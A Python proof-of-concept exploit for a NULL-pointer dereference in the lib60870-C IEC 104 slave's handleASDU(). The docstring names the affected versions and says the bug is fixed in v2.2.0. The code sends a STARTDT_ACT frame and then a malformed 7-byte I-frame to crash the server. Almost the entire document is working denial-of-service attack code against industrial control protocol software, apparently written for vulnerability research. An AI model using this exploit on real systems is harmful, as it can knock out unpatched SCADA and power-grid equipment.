#!/usr/bin/env python3
"""
PoC for the lib60870-C CS104 slave handleASDU() NULL-pointer dereference.

Bug (tags v0.9.4 / v2.0.0 / v2.0.1 / v2.1.0 / v2.1.1; fixed v2.2.0):
  cs104_slave.c handleMessage() calls
      CS101_ASDU_createFromBuffer(.., buffer + 6, msgSize - 6)
  and passes the result straight into handleASDU() with NO NULL check.
  A short I-frame whose ASDU body (msgSize - 6) is < the 6-byte ASDU header
  makes createFromBuffer return NULL -> handleASDU(NULL) ->
  CS101_ASDU_getCOT(NULL) -> deref of self->asdu[2] on a NULL self -> SIGSEGV.

Frame plan:
  1. STARTDT_ACT  : 68 04 07 00 00 00     (activates the connection)
  2. short I-frame: 68 05 00 00 00 00 00  (len=5 -> total 7 bytes on wire)
       control field = 00 00 00 00 -> I-format, N(S)=0, N(R)=0
       + 1 ASDU byte -> createFromBuffer sees msgLength = 7-6 = 1 < 6 -> NULL

Usage: poc_handleasdu_null.py <host> <port>
"""
import socket
import sys
import time

STARTDT_ACT = bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00])

# I-frame: 68, LEN, CF0..CF3 (all zero -> I-format N(S)=0 N(R)=0), then 1 ASDU
# byte. LEN = bytes after the length octet = 4 (control) + 1 (asdu) = 5.
SHORT_IFRAME = bytes([0x68, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00])


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2404

    print(f"[*] Connecting to {host}:{port}")
    s = socket.create_connection((host, port), timeout=5)
    s.settimeout(3)

    print(f"[*] -> STARTDT_ACT: {STARTDT_ACT.hex(' ')}")
    s.sendall(STARTDT_ACT)
    try:
        con = s.recv(64)
        print(f"[*] <- STARTDT_CON: {con.hex(' ')}")
    except socket.timeout:
        print("[!] no STARTDT_CON (server may already be dead)")

    time.sleep(0.2)

    print(f"[*] -> short I-frame: {SHORT_IFRAME.hex(' ')}  (msgSize=7, body=1 < 6)")
    try:
        s.sendall(SHORT_IFRAME)
    except OSError as e:
        print(f"[!] send failed: {e}")

    # After the crash the slave thread dies; ASan aborts the whole process.
    time.sleep(0.5)
    try:
        data = s.recv(64)
        if not data:
            print("[+] Connection closed by peer (server crashed) -> likely SIGSEGV")
        else:
            print(f"[*] <- unexpected reply: {data.hex(' ')}")
    except (socket.timeout, OSError) as e:
        print(f"[+] No reply / connection error ({e}) -> server crashed")

    s.close()
    print("[*] Done. Check `docker logs` for the ASan SEGV in handleASDU/getCOT.")


if __name__ == "__main__":
    main()
